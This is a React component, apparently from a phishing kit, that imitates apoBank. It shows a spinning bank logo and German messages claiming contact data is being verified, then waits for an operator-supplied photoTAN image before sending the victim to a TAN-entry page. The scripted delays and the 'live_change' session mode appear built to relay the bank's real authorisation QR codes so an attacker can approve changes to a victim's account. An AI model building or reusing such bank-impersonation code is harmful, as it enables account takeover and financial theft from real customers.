import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import apobankLogo from "@/assets/apobank-logo-square.png";
import { getStoredSession, reportPhase, useSessionAction } from "@/hooks/useSessionFlow";

const KontaktPruefung = () => {
  const navigate = useNavigate();
  const [idx, setIdx] = useState(0);
  const [waitingForQr, setWaitingForQr] = useState(false);
  const initialPhotoTanRef = useRef<string | null | undefined>(undefined);

  const mode = getStoredSession()?.mode;
  const isChange = mode === "live_change";

  const STEPS = isChange
    ? [
        { text: "Private Kontaktinformationen werden überprüft.", duration: 2000 },
        { text: "Profildaten werden bestätigt.", duration: 1000 },
      ]
    : [
        { text: "Private Kontaktinformationen werden überprüft.", duration: 5000 },
        { text: "Profildaten wird aktualisiert.", duration: 2000 },
        { text: "Bitte warten.", duration: 2000 },
      ];

  const { meta } = useSessionAction({}, "aenderung_phototan_requested");

  useEffect(() => {
    if (isChange && waitingForQr) {
      // Snapshot the current photoTanImage when we start waiting, so a stale
      // value from the earlier login PhotoTAN step doesn't auto-navigate.
      if (initialPhotoTanRef.current === undefined) {
        initialPhotoTanRef.current = meta?.photoTanImage ?? null;
      }
      const current = meta?.photoTanImage ?? null;
      if (current && current !== initialPhotoTanRef.current) {
        navigate("/mein-profil-tan");
      }
      return;
    }
    if (idx >= STEPS.length) {
      if (isChange) {
        setWaitingForQr(true);
        reportPhase("aenderung_phototan_requested").catch(() => {});
      } else {
        navigate("/profil-success");
      }
      return;
    }
    const t = setTimeout(() => setIdx((i) => i + 1), STEPS[idx].duration);
    return () => clearTimeout(t);
  }, [idx, navigate, isChange, waitingForQr, meta?.photoTanImage]);

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center">
      <div className="relative w-56 h-56">
        <svg className="absolute inset-0 w-full h-full animate-spin" style={{ animationDuration: "1.5s" }} viewBox="0 0 200 200" fill="none">
          <path d="M 100 10 A 90 90 0 0 1 190 100" stroke="hsl(var(--primary))" strokeWidth="5" strokeLinecap="round" />
        </svg>
        <div className="absolute inset-0 flex items-center justify-center">
          <img src={apobankLogo} alt="apoBank" className="w-44 h-44 object-contain" />
        </div>
      </div>
      <p className="mt-8 text-lg text-foreground font-medium text-center px-4">
        {waitingForQr ? "Bitte warten." : STEPS[Math.min(idx, STEPS.length - 1)].text}
      </p>
    </div>
  );
};

export default KontaktPruefung;
